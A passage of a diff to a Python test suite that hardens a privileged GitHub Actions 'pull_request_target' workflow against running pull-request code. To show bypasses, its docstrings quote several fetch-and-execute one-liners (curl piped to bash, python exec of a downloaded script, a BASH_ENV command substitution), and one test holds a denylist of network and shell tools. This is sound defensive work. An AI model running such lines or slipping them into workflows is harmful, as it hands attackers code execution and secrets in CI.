@@ -30,6 +30,7 @@ Run: python3 -m unittest discover -s scripts/pr_review -t .
 
 from __future__ import annotations
 
+import hashlib
 import itertools
 import json
 import os
@@ -282,6 +283,31 @@ def with_block(step: str) -> list[str]:
             break
         out.append(nxt)
     assert out, "the step's `with:` mapping is empty"
+    return out
+
+
+def indented_blocks(text: str, key: str) -> list[list[str]]:
+    """EVERY `key:` mapping in `text`, as lists of its more-indented lines.
+
+    `indented_block` returns only the FIRST, which is wrong for a scan that
+    has to see them all — a second `env:` mapping further down the job would
+    simply not be looked at.
+    """
+    lines = text.splitlines()
+    out: list[list[str]] = []
+    for i, ln in enumerate(lines):
+        m = _key_re(key).match(ln)
+        if not m or uncommented(m.group(1)):
+            continue  # not this key, or it has an inline value
+        indent = len(ln) - len(ln.lstrip())
+        block: list[str] = []
+        for nxt in lines[i + 1 :]:
+            if not nxt.strip() or nxt.lstrip().startswith("#"):
+                continue
+            if len(nxt) - len(nxt.lstrip()) <= indent:
+                break
+            block.append(nxt)
+        out.append(block)
     return out
 
 
@@ -1154,11 +1180,22 @@ class TestStage1CollapseGroupIsJobLevel(unittest.TestCase):
     and both Stage 2 runs skipped. Moving the group onto `capture` fixes it,
     because a job rejected by `if:` never enters the group.
 
-    This repo REQUIRES a workflow-level cancelling group, so the group cannot
-    simply be absent. The reconciliation is the suffix: the required prefix is
-    followed by the event's label, so two runs triggered by DIFFERENT labels
-    land in different groups and cannot cancel each other. Drop the suffix and
-    the incident above comes straight back.
+    The group is nonetheless PRESENT, and the suffix is the reconciliation:
+    the prefix is followed by the event's label, so two runs triggered by
+    DIFFERENT labels land in different groups and cannot cancel each other.
+    Drop the suffix and the incident above comes straight back.
+
+    WHY IT IS STILL HERE now that nothing requires it — and be precise about
+    which half does the work. The GROUP is what creates the hazard; the SUFFIX
+    is what defuses it. Deleting the whole block would also prevent the
+    incident, so this is not a control whose absence is unsafe. It used to be
+    mandatory: `.github/scripts/ensure_actions_will_cancel.py` demands a
+    workflow-level cancelling group with that exact prefix, and that checker
+    selects files with `"pull_request" in on` — an exact key match — so moving
+    to `pull_request_target` took this workflow out of scope. It stays because
+    every other pull-request workflow in the repository carries it, and being
+    the lone exception invites a later "fix". The state to forbid is the group
+    WITHOUT the suffix, which is what both tests below pin.
 
     Reverting either half is a small edit that looks tidier and silently
     restores the failure, which is why both are pinned rather than commented.
@@ -1170,7 +1207,12 @@ class TestStage1CollapseGroupIsJobLevel(unittest.TestCase):
     def test_workflow_level_group_is_differentiated_by_label(self):
         """Column 0 == workflow level. Present is fine; undifferentiated is not."""
         m = re.search(r"^concurrency:\n(?:[ \t]+.*\n)+", self.text, re.M)
-        self.assertIsNotNone(m, "this repo requires a workflow-level group")
+        self.assertIsNotNone(
+            m,
+            "Stage 1 lost its workflow-level group. No repo check enforces "
+            "that any more (see this class's docstring), so nothing else "
+            "would have caught it.",
+        )
         group = re.search(r"^\s+group:\s*(.+)$", m.group(0), re.M)
         self.assertIsNotNone(group, "workflow-level concurrency has no group")
         self.assertIn(
@@ -1192,6 +1234,1061 @@ class TestStage1CollapseGroupIsJobLevel(unittest.TestCase):
             "capture lost its concurrency group",
         )
         self.assertIn("cancel-in-progress: true", block)
+
+
+class TestStage1RunsNoPullRequestContent(unittest.TestCase):
+    """`pull_request_target` is why this workflow needs no CI approval, and it
+    is also why it would be the best foothold in the repository.
+
+    THE TRADE. pytorch/pytorch makes a maintainer approve CI for contributors
+    without write access. A review that starts on a label but then waits for a
+    second click is not the product, so Stage 1 has to run unapproved — and
+    `pull_request_target` is the trigger that does, because it runs from the
+    DEFAULT BRANCH with the repository's secrets and a write-scoped token.
+
+    THE OBLIGATION that buys. This file must execute nothing the pull request
+    wrote. Not "nothing dangerous"; nothing. It is the one workflow in this
+    design that holds a privileged context while a pull request is the subject,
+    so the property has to be structural rather than reviewed each time.
+
+    Each test below is one way the property could stop holding. They are
+    deliberately about SHAPE, not about intent: the adversary modelled here is
+    a maintainer adding a reasonable-looking step, which is how every published
+    `pull_request_target` compromise has actually happened.
+
+    NOT the only defence, and not load-bearing on its own. Stage 2 re-derives
+    pr_number, head_sha, base_sha and is_fork from the REST API and
+    authenticates the artifact against `github.event.workflow_run.head_sha`;
+    the artifact is corroborated, never believed. This is the layer that keeps
+    Stage 1 from being worth attacking in the first place.
+    """
+
+    def setUp(self):
+        self.raw = STAGE1.read_text()
+        self.text = strip_comments(self.raw)
+        self.capture = job_block(self.text, "capture")
+
+    # --- the trigger itself, and the two files agreeing about it -----------
+
+    def test_the_trigger_is_pull_request_target(self):
+        """`on: pull_request` would restore the approval click this exists to
+        avoid; anything else would stop the pipeline outright."""
+        on = self.text.split("jobs:", 1)[0]
+        self.assertRegex(
+            on,
+            r"(?m)^on:\s*\n\s+pull_request_target:",
+            "Stage 1's trigger is no longer `pull_request_target`; a fork PR's "
+            "review will now wait on a maintainer approving CI.",
+        )
+        # And not BOTH: a `pull_request` trigger alongside it would fire a
+        # second, PR-ref run of this same file under the same workflow NAME.
+        self.assertIsNone(
+            re.search(r"^\s+pull_request:", on, re.M),
+            "Stage 1 declares a `pull_request` trigger as well; that run comes "
+            "from the PR's own ref and shares this workflow's name.",
+        )
+
+    def test_stage2_accepts_runs_from_exactly_that_trigger(self):
+        """The two files must agree, and disagreement is SILENT.
+
+        Stage 2 gates on `workflow_run.event`. Change the trigger on one side
+        only and every run fails that condition: no review, no telemetry row,
+        and no failure anywhere — indistinguishable from a PR nobody labelled.
+        """
+        gate = job_if(job_block(STAGE2.read_text(), "prepare"))
+        self.assertIn(
+            "github.event.workflow_run.event == 'pull_request_target'",
+            " ".join(gate.split()),
+            "Stage 2 does not require the trigger Stage 1 uses; the pipeline "
+            "would go quiet rather than fail.",
+        )
+
+    def test_the_event_condition_is_binding_and_not_merely_present(self):
+        """Same contract as the workflow-path pin, and now the stronger of the
+        two: a PR-authored workflow cannot produce a `pull_request_target`
+        event at all, because since 2025-12-08 that trigger reads the file from
+        the repository's DEFAULT BRANCH, whatever the PR's base branch is.
+        Demote this behind a `||` and the lookalike path reopens.
+        """
+        expr = job_if(job_block(STAGE2.read_text(), "prepare"))
+        tree = parse_bool_expr(expr)
+        atoms = expr_atoms(tree)
+        target = [
+            a
+            for a in atoms
+            if re.fullmatch(
+                r"github\.event\.workflow_run\.event\s*==\s*'pull_request_target'", a
+            )
+        ]
+        self.assertEqual(len(target), 1, f"expected one event condition, got {target}")
+        others = sorted(atoms - {target[0], "true", "false"})
+        self.assertLessEqual(len(others), 12, f"too many conditions: {others}")
+        for bits in itertools.product([False, True], repeat=len(others)):
+            env = dict(zip(others, bits))
+            env[target[0]] = False
+            self.assertFalse(
+                eval_expr(tree, env),
+                f"prepare's gate admits a run NOT triggered by "
+                f"pull_request_target, given {env}. A pull request can add a "
+                f"`pull_request` workflow with this one's name, so that path "
+                f"is reachable by anyone who can open a PR.",
+            )
+
+    # --- the SET of things that run, not just the shape of each one --------
+
+    EXPECTED_JOBS = ("capture",)
+    EXPECTED_STEPS = ("Capture PR coordinates", "Upload capture artifact")
+    # Job-level keys that introduce execution WITHOUT adding a step. A
+    # `services:` or `container:` image runs before step 1; `defaults.run`
+    # rewrites every step's shell; a job-level `uses:` makes the whole job a
+    # call to a workflow defined elsewhere. None would be caught by counting
+    # steps, which is why they are named rather than assumed absent.
+    FORBIDDEN_JOB_KEYS = ("container", "services", "defaults", "uses", "strategy")
+    # The only keys a step here may carry. `shell:` is absent deliberately: it
+    # selects the interpreter, and the executable tests below run the script
+    # under bash, so a step that quietly became `shell: python3 {0}` would be
+    # tested by something other than what runs it.
+    ALLOWED_STEP_KEYS = frozenset(("name", "env", "run", "uses", "with"))
+    # sha256[:16] of each step's DEDENTED `run:` body. Step NAMES do not pin
+    # step CONTENT — a line added inside the existing capture script needs no
+    # new step, no new job key, no workflow expression and no forbidden token,
+    # and the set-pin above sees nothing. So the script itself is pinned.
+    # Update these deliberately when you change the shell, which is the whole
+    # point: in this file that has to be an act, not an edit.
+    EXPECTED_RUN_DIGESTS = {"Capture PR coordinates": "b7f92a5e3a939bcc"}
+    # The exact action each step may use. "Pinned to a SHA" is not enough on
+    # its own: `actions/github-script` at a real pinned SHA, with a
+    # `with.script: |` body, executes JavaScript that can read the PR payload
+    # and run whatever it likes — no forbidden shell token, no `${{ }}`, no
+    # change to any `run:` digest, and the step keeps its name. Which action
+    # runs is as load-bearing as which script does.
+    EXPECTED_USES = {
+        "Upload capture artifact": (
+            "actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02"
+        )
+    }
+
+    def _step_entries(self) -> list[str]:
+        """Every entry of `steps:`, NAMED OR NOT, as blocks of text.
+
+        Two earlier versions were bypassable, and the second is why this
+        matches the MARKER ALONE:
+
+        * Splitting on `- name:` missed an unnamed `- run: curl … | bash`
+          entirely, so every per-step check skipped it.
+        * Requiring `- ` — exactly one space — then missed `-  run:` with two
+          spaces, and a bare `-` on its own line with the mapping beneath it.
+          Both are valid YAML and both are one keystroke from the first fix.
+
+        So any list marker at the steps indent starts an entry, whatever
+        follows. The caller then requires each entry to begin `name: …`, which
+        is what turns an unmodelled spelling into a LOUD failure naming this
+        reader rather than into a step nothing enumerated.
+        """
+        lines = self.capture.splitlines()
+        starts = [i for i, ln in enumerate(lines) if re.match(r"^      -(\s|$)", ln)]
+        assert starts, "premise changed: no step entries found in `capture`"
+        bounds = starts + [len(lines)]
+        return ["\n".join(lines[a:b]) for a, b in zip(starts, bounds[1:])]
+
+    @staticmethod
+    def _entry_name(entry: str) -> str:
+        """A step entry's `name:`, or a locator when it has none.
+
+        A bare `-` puts the mapping on the NEXT line, so the name may be one
+        line down. `test_the_jobs_and_steps_are_exactly_these` is what REQUIRES
+        a name; this only has to identify the step in a failure message.
+        """
+        body = [ln for ln in entry.splitlines() if ln.strip()]
+        first = body[0]
+        if first.rstrip() == "      -" and len(body) > 1:
+            first = "      - " + body[1].lstrip()
+        m = re.match(r"^      -\s+name:\s*(\S.*)$", first)
+        return plain_scalar(m.group(1)) if m else f"(unnamed: {first.strip()!r})"
+
+    def test_the_jobs_and_steps_are_exactly_these(self):
+        """THE CONTRACT THE SHAPE TESTS CANNOT GIVE, and the reason it is here.
+
+        Every other test in this class forbids a SHAPE. None of them bounds the
+        SET. A step running
+
+            curl -fsSL https://raw.githubusercontent.com/x/y/z/setup.sh | bash
+
+        has no checkout, no `ref:`, no `${{ }}`, no workspace path, no secret
+        and no unpinned `uses:` — it passes every prohibition above and
+        executes attacker-chosen code in a privileged context. The executable
+        tests would not notice either: they run "Capture PR coordinates" and
+        nothing else.
+
+        So the set is pinned, and pinned over step ENTRIES rather than over
+        step NAMES — an unnamed step is exactly how the first version of this
+        test was bypassed. Adding a step now REQUIRES editing this list, which
+        is the point: it turns "nobody noticed the new step" into "someone had
+        to type its name into the file that says this job runs no
+        pull-request content".
+        """
+        # Scoped to the `jobs:` mapping. Matching every two-space key over the
+        # whole file also collected `pull_request_target:` from under `on:`,
+        # which is a trigger and not a job.
+        body = self.text.split("\njobs:", 1)
+        self.assertEqual(len(body), 2, "premise changed: no top-level `jobs:` key")
+        # FAIL CLOSED over the jobs mapping, rather than matching job keys and
+        # ignoring what does not match. Three spellings got past three
+        # successive versions of a matching rule — a flow mapping
+        # (`extra: {runs-on: …}`), a quoted key (`"extra":`), and a space
+        # before the colon (`extra :`) — each of which defines a real job and
+        # left the enumerated tuple reading `("capture",)`. Every line at the
+        # jobs indent must now be a plain key introducing a block, or this
+        # test says so by name.
+        jobs = []
+        for ln in body[1].splitlines():
+            if not ln.strip() or ln.lstrip().startswith("#"):
+                continue
+            if len(ln) - len(ln.lstrip()) != 2:
+                continue
+            m = re.match(r"^  ([a-z_][a-z0-9_-]*):\s*$", ln.rstrip())
+            self.assertIsNotNone(
+                m,
+                f"the line {ln.rstrip()!r} sits at the jobs indent but is not "
+                "a plain `name:` introducing a block. It may be a perfectly "
+                "good job — quoted, a flow mapping, or with a space before "
+                "the colon — and this reader cannot count it, which is how a "
+                "second job hides from the exact-set assertion below.",
+            )
+            jobs.append(m.group(1))
+        jobs = tuple(jobs)
+        self.assertEqual(
+            jobs,
+            self.EXPECTED_JOBS,
+            f"Stage 1's jobs are {jobs}. Every job here runs in a privileged "
+            "context with no CI approval; adding one is a deliberate act.",
+        )
+
+        entries = self._step_entries()
+        names = []
+        for entry in entries:
+            # A bare `-` puts the mapping on the NEXT line, so the name may be
+            # one line down. Both spellings are legal and both must land on
+            # `name:` as the entry's first key.
+            body = [ln for ln in entry.splitlines() if ln.strip()]
+            first = body[0]
+            if first.rstrip() == "      -" and len(body) > 1:
+                first = "      - " + body[1].lstrip()
+            m = re.match(r"^      -\s+name:\s*(\S.*)$", first)
+            self.assertIsNotNone(
+                m,
+                f"a step in Stage 1 does not begin with `name:` ({first.strip()!r}). "
+                "Unnamed steps are forbidden here because the checks in this "
+                "class are keyed to the named set, and an unnamed one is the "
+                "cheapest way to add an executable body nobody enumerated.",
+            )
+            names.append(plain_scalar(m.group(1)))
+        self.assertEqual(
+            tuple(names),
+            self.EXPECTED_STEPS,
+            f"Stage 1's steps are {tuple(names)}. If you added one, add it here "
+            "too — and re-read this class's docstring first, because a step "
+            "that fetches or executes anything breaks the property the trigger "
+            "depends on.",
+        )
+
+    def test_the_job_declares_no_execution_outside_its_steps(self):
+        """Counting steps does not bound a `services:` image or `defaults.run`.
+
+        These start containers or rewrite every step's shell without appearing
+        in the step list at all, so the set-pin above cannot see them.
+
+        SCANNED OVER THE WHOLE JOB, and over the workflow level too. An
+        earlier version read only the text BEFORE `steps:`, which quietly made
+        the check depend on key ORDER — YAML does not, so `services:` written
+        after the step list started the image and the test saw nothing. The
+        workflow level matters for the same reason: a `defaults.run.shell`
+        there changes the interpreter of the very step the executable tests
+        run under an explicitly-chosen bash.
+        """
+        # THE WHOLE FILE at column 0, not the region before `jobs:`. YAML
+        # does not constrain key order, so `defaults:` written AFTER the jobs
+        # mapping is still a workflow-level key and the earlier split could
+        # not see it. This is the same order assumption that had to be
+        # removed from the job-level scan below.
+        workflow_level = self.text
+        for key in self.FORBIDDEN_JOB_KEYS:
+            self.assertIsNone(
+                re.search(rf"(?m)^[\"']?{key}[\"']?:", workflow_level),
+                f"Stage 1 declares `{key}:` at workflow level, which reaches "
+                "the capture job without appearing in it.",
+            )
+            self.assertIsNone(
+                re.search(rf"(?m)^    {key}:", self.capture),
+                f"the capture job declares `{key}:`. That introduces execution "
+                "or configuration this class's step-level checks do not see; "
+                "if it is genuinely needed, review it against the no-untrusted-"
+                "content property first, then teach this test.",
+            )
+
+    def test_every_step_script_is_the_one_that_was_reviewed(self):
+        """THE CONTROL THE SET-PIN CANNOT GIVE, and the one that closes it.
+
+        Pinning step NAMES bounds how many things run. It says nothing about
+        WHAT they run. One line inside the existing capture script —
+
+            python3 -c 'import urllib.request;
+                        exec(urllib.request.urlopen("https://x/p.py").read())'
+
+        — adds no step, no job key and no workflow expression, and matches no
+        token in the denylist below. Every other check in this class passes.
+
+        A denylist cannot fix that; there is always another spelling. So the
+        script is pinned by DIGEST. Any edit to the shell of a workflow that
+        runs in a privileged context without CI approval now has to be typed
+        into this file as well, which is the reviewability property the whole
+        class is claiming.
+
+        If you are here after a legitimate change: read the diff, satisfy
+        yourself it executes nothing the pull request wrote, then paste the
+        digest the failure message prints.
+        """
+        seen = {}
+        for entry in self._step_entries():
+            name = self._entry_name(entry)
+            runs = block_scalars(entry, "run")
+            if not runs:
+                continue
+            self.assertEqual(
+                len(runs), 1, f"step {name!r} has {len(runs)} `run:` blocks"
+            )
+            body = textwrap.dedent("\n".join(runs[0][1]))
+            seen[name] = hashlib.sha256(body.encode()).hexdigest()[:16]
+        self.assertEqual(
+            seen,
+            dict(self.EXPECTED_RUN_DIGESTS),
+            "a Stage 1 step's shell changed. This job runs with the "
+            "repository's context and no CI approval, so its script is pinned "
+            "rather than merely shaped. Review the change, then update "
+            "EXPECTED_RUN_DIGESTS with the values above.",
+        )
+
+    def test_every_step_uses_exactly_the_action_that_was_reviewed(self):
+        """Which ACTION runs, not merely that it is pinned to some SHA.
+
+        The sibling test establishes that no action is a local path or a
+        mutable tag. It does not establish WHICH action, and swapping
+        `actions/upload-artifact` for `actions/github-script` at an equally
+        real SHA turns a `with:` input into an execution vector that no shell
+        check here can see.
+        """
+        seen = {}
+        for entry in self._step_entries():
+            for ln in entry.splitlines():
+                if m := _key_re("uses").match(ln.replace("- uses:", "uses:", 1)):
+                    seen[self._entry_name(entry)] = uncommented(m.group(1))
+        self.assertEqual(
+            seen,
+            dict(self.EXPECTED_USES),
+            "a Stage 1 step's action changed. This job runs with the "
+            "repository's context and no CI approval, so the action is pinned "
+            "by identity as well as by SHA. Review what the new action can do "
+            "with its inputs, then update EXPECTED_USES.",
+        )
+
+    def test_no_step_declares_a_key_outside_the_allowlist(self):
+        """`shell:` is a step key, so `FORBIDDEN_JOB_KEYS` never sees it — and
+        it changes the interpreter of a script the executable tests below run
+        under bash. An allowlist rather than another denylist, because the
+        interesting keys are the ones nobody has thought of yet."""
+        for entry in self._step_entries():
+            name = self._entry_name(entry)
+            keys = {
+                m.group(1)
+                for ln in entry.splitlines()
+                if (m := re.match(r"^\s+(?:- )?([A-Za-z_][\w-]*):", ln))
+                and len(ln) - len(ln.lstrip()) <= 8
+            }
+            extra = sorted(keys - self.ALLOWED_STEP_KEYS)
+            self.assertEqual(
+                extra,
+                [],
+                f"step {name!r} declares {extra}, which this class does not "
+                "model. If the key is genuinely needed, decide what it means "
+                "for 'this job executes nothing the pull request wrote', then "
+                "add it to ALLOWED_STEP_KEYS.",
+            )
+
+    # Every environment variable this workflow may set, at ANY scope. An
+    # allowlist rather than a denylist because the dangerous ones are not the
+    # ones with dangerous names: `BASH_ENV` makes non-interactive bash source
+    # a file — or run a command substitution — BEFORE the pinned script, so it
+    # executes arbitrary code while leaving every `run:` digest untouched.
+    # `LD_PRELOAD`, `PYTHONSTARTUP`, `GIT_*_PAGER` and `ENV` are the same
+    # shape. Six values, all GitHub-generated, plus the trusted label.
+    ALLOWED_ENV_KEYS = frozenset(
+        (
+            "REVIEW_LABEL",
+            "PR_NUM",
+            "HEAD_SHA",
+            "BASE_SHA",
+            "BASE_REF",
+            "IS_FORK",
+            "TRIGGER_EVENT",
+        )
+    )
+
+    def test_every_environment_key_is_on_the_allowlist(self):
+        """Pinning the SCRIPT does not pin what bash runs before it.
+
+        The digest covers the `run:` body. It does not cover the environment
+        the shell starts in, and several standard variables turn that
+        environment into an execution vector on their own.
+        """
+        # THE WHOLE FILE. Scanning "the prefix before `jobs:`" plus "the
+        # capture job" left a third region uncovered: a top-level `env:`
+        # written AFTER the jobs mapping is valid YAML, reaches the job, and
+        # sat in neither. Whole-file GRAMMAR coverage does not make a narrower
+        # semantic scan complete — they are separate properties.
+        #
+        # ACCEPTED OVER-REACH: this collects EVERY mapping named `env`, not
+        # only the three that configure a runtime environment. A workflow
+        # declaring `on.workflow_dispatch.inputs.env` would have its
+        # `description:`/`type:` keys rejected as variable names. That is a
+        # false positive on a legal edit, and it is the deliberate trade for
+        # this file: two jobs' worth of YAML, one allowlist, and a failure
+        # that says exactly what to do. Narrow it to the three real scopes if
+        # this file ever grows an input named `env`.
+        for block in indented_blocks(self.text, "env"):
+            for ln in block:
+                m = re.match(r"^\s*[\"']?([A-Za-z_][\w-]*)[\"']?\s*:", ln)
+                if not m:
+                    continue
+                self.assertIn(
+                    m.group(1),
+                    self.ALLOWED_ENV_KEYS,
+                    f"an `env:` mapping in Stage 1 sets {m.group(1)!r}, which "
+                    "this class does not model. Some variable names make the "
+                    "shell execute code before the pinned script runs "
+                    "(BASH_ENV, ENV, LD_PRELOAD, PYTHONSTARTUP); decide which "
+                    "this is, then add it to ALLOWED_ENV_KEYS.",
+                )
+
+    def test_stage1_uses_only_spellings_this_class_can_read(self):
+        """FAIL CLOSED ON A GRAMMAR, instead of chasing spellings one at a time.
+
+        Five review rounds each found another legal YAML spelling that a
+        reader here did not model — `-  run:` with two spaces, a bare `-`
+        marker, `"extra":` quoted, `extra :` with a space before the colon, a
+        flow mapping, a key written after `jobs:`, an `&anchor` on an `env:`
+        header. Each fix was correct and each left the next one open, because
+        the language has more spellings than a text reader has rules and the
+        bypass is always one keystroke from the last fix.
+
+        So the direction is inverted: this asserts the file is written in the
+        NARROW SUBSET the readers above are built for, and anything outside it
+        is a loud failure naming this test rather than a silent mis-read. Same
+        trade `TestTheReadersPremisesStillHold` makes for the Stage 2 readers.
+
+        THE WHOLE FILE, not the capture job. Scoping it to the job left
+        workflow-level configuration outside the subset, and that is where the
+        two nastiest vectors live: `defaults : {run: {shell: 'bash -c "…"'}}`
+        before `jobs:` changes the interpreter of a script whose digest never
+        moves. A grammar that covers only part of a file is not a grammar.
+
+        Reformatting the workflow stays legal; reformatting it into a spelling
+        nothing here can parse does not.
+        """
+        lines = self.text.split("\n")
+        i = 0
+        while i < len(lines):
+            raw = lines[i]
+            i += 1
+            if not raw.strip():
+                continue
+            # Step over block-scalar bodies wholesale: that is shell, not YAML.
+            m = _ANY_BLOCK_KEY.match(raw)
+            if m and BLOCK_HEADER.fullmatch(uncommented(m.group(2)) or "x"):
+                indent = len(raw) - len(raw.lstrip())
+                while i < len(lines) and (
+                    not lines[i].strip()
+                    or len(lines[i]) - len(lines[i].lstrip()) > indent
+                ):
+                    i += 1
+                continue
+            body = raw.rstrip()
+            self.assertNotIn(
+                "\t",
+                body,
+                f"a tab in Stage 1 ({body!r}); every reader here measures "
+                "indentation in spaces.",
+            )
+            # YAML NODE PROPERTIES on a key's value. `env: &capture_env` is an
+            # anchor on an otherwise-empty mapping: YAML reads the indented
+            # lines under it as that mapping's entries, while every reader
+            # here sees a key WITH an inline value and steps over the block —
+            # so `BASH_ENV: '$(touch INJECTED)'` beneath it was scanned by
+            # nothing. `*alias` and `!!tag` hide content the same way.
+            inline = body.split(":", 1)[1].strip() if ":" in body else ""
+            self.assertNotRegex(
+                inline,
+                r"^[&*!]",
+                f"the Stage 1 line {body!r} carries a YAML anchor, alias or "
+                "tag. Every reader here is line-oriented and treats such a "
+                "header as a key with a value, so it steps over the block "
+                "beneath it — which is where the content would be. EVERY "
+                "leading `!`, not just `!!`: `!<tag:yaml.org,2002:map>` is an "
+                "explicit mapping tag and hides a block exactly as well.",
+            )
+            stripped = body.lstrip()
+            # A list marker must INTRODUCE its first key on the same line.
+            #
+            # A bare `-` with the mapping beneath it is legal YAML and puts
+            # the entry's keys at an indentation nothing here derives: the
+            # step-key allowlist reads keys at `<= 8` spaces, so a bare marker
+            # at six with its mapping at ten hides every key from it — `shell:
+            # "bash -c …"` included. Rather than teach four readers to derive
+            # per-entry indentation, the spelling is refused, which keeps step
+            # keys at a fixed column and the `<= 8` bound correct by
+            # construction.
+            if re.fullmatch(r"-", stripped):
+                self.fail(
+                    f"the Stage 1 line {body!r} is a bare list marker. Write "
+                    "the entry's first key on the same line (`- name: …`): a "
+                    "bare marker puts the mapping at an indentation the "
+                    "step-key allowlist does not scan."
+                )
+            if re.match(r"^- \S", stripped):
+                stripped = re.sub(r"^-\s*", "", stripped)
+                if not stripped:
+                    continue
+            # Keys are unquoted, have no space before the colon, and are
+            # either lower-case YAML keys (`runs-on`, `timeout-minutes`) or
+            # UPPER_SNAKE environment names.
+            self.assertRegex(
+                stripped,
+                r"^(?:[a-z_][a-z0-9_-]*|[A-Z_][A-Z0-9_]*):(?: .*)?$",
+                f"the Stage 1 line {body!r} is not an unquoted, "
+                "space-free-before-the-colon mapping key in the subset these "
+                "readers parse. It may be perfectly good YAML — but the job "
+                "enumerator, the step enumerator, the key allowlist and the "
+                "env scan are all line-at-a-time and would each read it "
+                "wrong. Rewrite it in the plain form, or teach every one of "
+                "them and widen this grammar.",
+            )
+            # A flow mapping hides its keys from every line-oriented reader
+            # here. Two brace users are NOT that and must not red: a `${{ }}`
+            # expression, and the empty mapping `{}` — which is how
+            # `permissions:` is spelled, and which declares nothing at all.
+            without_exprs = re.sub(r"\$\{\{.*?\}\}", "", stripped, flags=re.S)
+            self.assertNotIn(
+                "{",
+                re.sub(r":\s*\{\s*\}\s*$", ":", without_exprs),
+                f"the Stage 1 line {body!r} uses a flow mapping. Every "
+                "reader in this class is line-oriented and a flow mapping "
+                "hides its keys from all of them.",
+            )
+
+    def test_no_step_reaches_the_network_or_evaluates_fetched_text(self):
+        """Defence in depth behind the step-set pin, and it names the hazard.
+
+        Scanned over the WHOLE job rather than per named step: a per-step loop
+        keyed to `- name:` skipped an unnamed `- run:` entirely, which is the
+        one case this most needs to catch.
+        """
+        forbidden = (
+            "curl",
+            "wget",
+            "nc ",
+            "pip install",
+            "npm ",
+            "npx ",
+            "eval ",
+            "source ",
+            "bash <",
+            "sh <",
+            "| bash",
+            "| sh",
+        )
+        for token in forbidden:
+            self.assertNotIn(
+                token,
+                self.capture,
+                f"Stage 1 contains {token!r}. This job runs with the "
+                "repository's context and without CI approval; it must not "
+                "fetch or evaluate anything.",
+            )
+
+    # --- nothing from the pull request is fetched, resolved or read --------
+
+    def test_nothing_is_checked_out(self):
+        """No checkout means no PR tree, no submodules, no PR-supplied
+        `.git/config`, and nothing on disk for a later step to source."""
+        self.assertNotIn("actions/checkout", self.text)
+        self.assertNotIn("git clone", self.text)
+        self.assertNotIn("git fetch", self.text)
+
+    def test_no_step_takes_a_ref_input(self):
+        """`ref:` is how a checkout is aimed at the pull request. Under this
+        trigger a checkout with no `ref:` takes the default branch, which is
+        safe; naming a ref is
+        how that stops being true, so the key may not appear at all."""
+        offenders = [ln for ln in self.text.splitlines() if _key_re("ref").match(ln)]
+        self.assertEqual(
+            offenders,
+            [],
+            f"Stage 1 has a `ref:` input ({offenders}). Under "
+            "pull_request_target that points a privileged job at code the pull "
+            "request controls.",
+        )
+
+    def test_every_action_is_a_pinned_third_party_sha(self):
+        """`uses: ./x` resolves from the WORKSPACE. There is no checkout today,
+        so it would resolve to nothing — but it is the shape that turns lethal
+        the moment one is added, and a tag or branch is mutable by its owner."""
+        uses = [
+            uncommented(m.group(1))
+            for ln in self.text.splitlines()
+            if (m := _key_re("uses").match(ln)) or (m := _key_re("- uses").match(ln))
+        ]
+        self.assertTrue(uses, "premise changed: Stage 1 uses no actions at all")
+        for value in uses:
+            self.assertRegex(
+                value,
+                r"^[A-Za-z0-9][\w.-]*/[\w.-]+(?:/[\w.-]+)*@[0-9a-f]{40}$",
+                f"the action {value!r} is not a third-party repository pinned "
+                "to a full commit SHA. A `./local` path resolves from the "
+                "workspace and a tag can be moved by whoever owns it.",
+            )
+
+    def test_no_shell_interpolates_a_workflow_expression(self):
+        """THE script-injection contract, and the reason the `env:` block exists.
+
+        `${{ }}` is substituted into the script TEXT before bash sees it, so a
+        value containing a quote or a `$(` becomes code. Passing values through
+        `env:` and reading them as `"$VAR"` cannot do that, whatever they hold.
+        Checked by executing the extracted shell as well — see below — because
+        a trailing `#` satisfies a substring assertion and `strip_comments`
+        only drops whole-line comments.
+        """
+        for step in self._step_entries():
+            for _, body in block_scalars(step, "run"):
+                script = "\n".join(body)
+                self.assertNotIn(
+                    "${{",
+                    script,
+                    "a Stage 1 `run:` interpolates a workflow expression "
+                    "directly into the script; route it through `env:` and "
+                    "quote it instead.",
+                )
+
+    def test_no_shell_reads_the_workspace(self):
+        """Nothing is checked out there, so a read finds nothing today. It is
+        forbidden anyway: paired with a checkout added later it is the whole
+        attack, and the pairing is what nobody notices in review."""
+        for step in self._step_entries():
+            for _, body in block_scalars(step, "run"):
+                script = "\n".join(body)
+                for token in ("GITHUB_WORKSPACE", "github.workspace", "/pr/"):
+                    self.assertNotIn(
+                        token,
+                        script,
+                        f"a Stage 1 `run:` mentions {token!r}; this job must "
+                        "not read anything the pull request could have put on "
+                        "disk.",
+                    )
+
+    # --- the privileged context this trigger hands out is refused ----------
+
+    def test_no_secret_is_referenced(self):
+        """`pull_request_target` makes the full secret store readable here."""
+        self.assertNotIn(
+            "secrets.",
+            self.text,
+            "Stage 1 reads a secret. Under this trigger that secret is "
+            "available while a pull request is the subject, and Stage 1's "
+            "output is a public artifact.",
+        )
+
+    def test_permissions_are_empty_at_both_levels(self):
+        """The token this trigger mints carries write scopes by default.
+
+        Workflow level so a job added later starts at zero, and job level so
+        the one job that exists says so itself.
+        """
+        header = self.text.split("jobs:", 1)[0]
+        self.assertRegex(
+            header,
+            r"(?m)^permissions:\s*\{\}\s*$",
+            "Stage 1 has no workflow-level `permissions: {}`; a job added "
+            "later would inherit a write-scoped token.",
+        )
+        self.assertRegex(
+            self.capture,
+            r"(?m)^\s{4}permissions:\s*\{\}\s*$",
+            "the capture job no longer drops its permissions. It does no "
+            "checkout and makes no API call, so it needs none.",
+        )
+
+    def test_every_interpolated_expression_is_one_of_these(self):
+        """The enumeration, written out because "no untrusted input" is a
+        claim about a SET and a set has to be listed to be checked.
+
+        Everything here is GitHub-generated and either numeric, a SHA, a
+        maintainer-controlled ref, or a boolean. None of it is text a
+        contributor can write: not `title`, not `body`, not `head.ref`, not
+        `user.login`. Adding one of those is the change this test exists to
+        stop, and it is a plausible change — "log which PR we captured" is how
+        it would be phrased.
+
+        Scope, stated: this covers `${{ }}` interpolations. The job `if:` is
+        a boolean gate whose result is a decision rather than a value, and it
+        is pinned separately by TestTheLabelGateIsWhatSelectsAPr.
+        """
+        allowed = {
+            "github.workflow": "the workflow's own name",
+            "github.repository": "owner/repo of the base repository",
+            "github.event.pull_request.number || github.sha": "PR number, integer",
+            "github.event_name == 'workflow_dispatch'": "boolean",
+            "github.event.label.name": "label name; maintainer-applied, and it "
+            "reaches a concurrency group, never a shell",
+            "github.event.pull_request.number": "integer",
+            "github.event.pull_request.head.sha": "40-hex, GitHub-computed",
